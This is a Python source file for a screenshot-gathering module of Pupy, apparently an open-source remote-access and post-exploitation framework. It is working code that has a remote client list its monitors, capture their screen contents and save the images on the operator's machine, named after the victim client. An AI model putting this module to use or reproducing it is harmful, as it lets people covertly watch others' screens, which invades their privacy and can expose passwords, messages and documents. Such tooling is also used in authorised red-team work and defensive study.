# -*- coding: utf-8 -*-

# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu) All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import *
from os import path

import time
import datetime
import subprocess

__class_name__="screenshoter"


@config(cat="gather")
class screenshoter(PupyModule):
    """ take a screenshot :) """

    dependencies = ['mss', 'screenshot']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
        self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
        self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')

    def run(self, args):
        rscreenshot = self.client.conn.modules['screenshot']
        if args.enum:
            self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
            for i, screen in enumerate(rscreenshot.screens()):
                if not (screen['width'] and screen['height']):
                    continue

                self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
                    i,
                    '{}x{}'.format(screen['width'], screen['height']),
                    '({}x{})'.format(screen['top'], screen['left'])))
            return

        screenshots, error = rscreenshot.screenshot(args.screen)
        if not screenshots:
            self.error(error)
        else:
            self.success('number of monitor detected: %s' % str(len(screenshots)))
            
            for screenshot in screenshots:
                filepath = path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".png")
                with open(filepath, 'w') as out:
                    out.write(screenshot)
                    # sleep used to be sure the file name will be different between 2 differents screenshots
                    time.sleep(1)
                    self.success(filepath)

                # if args.view:
                #     viewer = config.get('default_viewers', 'image_viewer')
                #     subprocess.Popen([viewer, output])
